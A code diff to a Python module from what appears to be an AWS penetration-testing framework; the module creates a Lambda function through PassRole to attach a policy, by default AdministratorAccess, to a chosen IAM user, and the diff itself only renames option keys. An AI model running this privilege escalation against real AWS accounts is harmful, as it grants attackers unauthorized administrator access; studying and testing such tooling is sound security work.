@@ -20,17 +20,17 @@ class RLModule(Module):
                             "lambda:InvokeFunction. "
                             "(and lambda:DeleteFunction")
         self.author = "Takahiro Yokoyama"
-        self.options["user"] = {
+        self.options["UserName"] = {
             "Description": "User to elevate privilege.",
             "Required": True,
             "Value": ""
         }
-        self.options["policyarn"] = {
+        self.options["PolicyArn"] = {
             "Description": "Policy to attach to user.",
             "Required": True,
             "Value": "arn:aws:iam::aws:policy/AdministratorAccess"
         }
-        self.options["rolearn"] = {
+        self.options["RoleArn"] = {
             "Description": ("The Amazon Resource Name (ARN) of"
                             " the function's execution role."),
             "Required": True,
@@ -40,8 +40,8 @@ class RLModule(Module):
     def run(self):
         result = []
         client = boto3.client("lambda", **self["profile"])
-        user = shlex.quote(self["user"])
-        policyarn = shlex.quote(self["policyarn"])
+        user = shlex.quote(self["UserName"])
+        policyarn = shlex.quote(self["PolicyArn"])
         # I'm afraid this is really secure
         lambda_privesc = f"""
 import boto3
@@ -69,7 +69,7 @@ def lambda_handler(event, context):
                     self._handle_err(
                         client.create_function,
                         FunctionName=func_name,
-                        Role=self["rolearn"],
+                        Role=self["RoleArn"],
                         Handler="lambda_privesc.lambda_handler",
                         Code={"ZipFile": zfile_bytes},
                         Runtime="python3.9"
